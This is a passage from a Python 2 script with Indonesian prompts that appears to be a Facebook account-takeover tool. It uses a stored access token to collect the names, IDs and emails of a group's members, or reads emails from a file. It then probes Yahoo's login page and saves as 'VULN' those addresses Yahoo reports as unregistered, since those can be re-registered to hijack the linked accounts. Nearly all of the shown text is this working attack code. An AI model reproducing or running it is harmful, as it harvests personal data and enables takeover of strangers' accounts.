	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;96m[+] \033[1;92mFile tersimpan \033[1;91m:\033[1;97m out/TemanMailVuln.txt"
	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
	menu()
	
def clone_dari_member_group():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print 42*"\033[1;96m="
	id=raw_input('\033[1;96m[+] \033[1;93mMasukan ID group \033[1;91m:\033[1;97m ')
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
		asw=json.loads(r.text)
		print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama group \033[1;91m:\033[1;97m "+asw['name']
	except KeyError:
		print"\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan"
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	jalan('\033[1;96m[✺] \033[1;93mMengambil email \033[1;97m...')
	teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
	kimak = json.loads(teman.text)
	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
	print 42*"\033[1;96m="
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					print("\033[1;96m[✓] \033[1;92mVULN")
					print("\033[1;96m[➹] \033[1;97mID   \033[1;91m: \033[1;92m"+id)
					print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
					print("\033[1;96m[➹] \033[1;97mNama \033[1;91m: \033[1;92m"+nama)
					save = open('out/GrupMailVuln.txt','a')
					save.write("Nama : "+ nama + '\n' "ID        : "+ id + '\n' "Email  : "+ mail + '\n\n')
					save.close()
					berhasil.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;96m[+] \033[1;92mFile tersimpan \033[1;91m:\033[1;97m out/GrupMailVuln.txt"
	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
	menu()
	

def clone_dari_file():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	files = raw_input("\033[1;96m[+] \033[1;93mNama File \033[1;91m: \033[1;97m")
	try:
		total = open(files,"r")
		mail = total.readlines()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mFile tidak ditemukan"
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	mpsh = []
	jml = 0
	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
	print 42*"\033[1;96m="
	mail = open(files,"r").readlines()
	for pw in mail:
		mail = pw.replace("\n","")
		jml +=1
		mpsh.append(jml)
		yahoo = re.compile(r'@.*')
		otw = yahoo.search(mail).group()
		if 'yahoo.com' in otw:
			br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
			br._factory.is_html = True
			br.select_form(nr=0)
			br["username"] = mail
			klik = br.submit().read()
			jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
			try:
				pek = jok.search(klik).group()
			except:
				continue
			if '"messages.ERROR_INVALID_USERNAME">' in pek:
				print("\033[1;96m[✓] \033[1;92mVULN")
				print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
				save = open('out/MailVuln.txt','a')
				save.write("Email: "+ mail + '\n\n')
				save.close()
				berhasil.append(mail)
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;96m[+] \033[1;92mFile Tersimpan \033[1;91m:\033[1;97m out/FileMailVuln.txt"
	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
	menu()
	
       
		
if __name__=='__main__':
        menu()
        masuk()
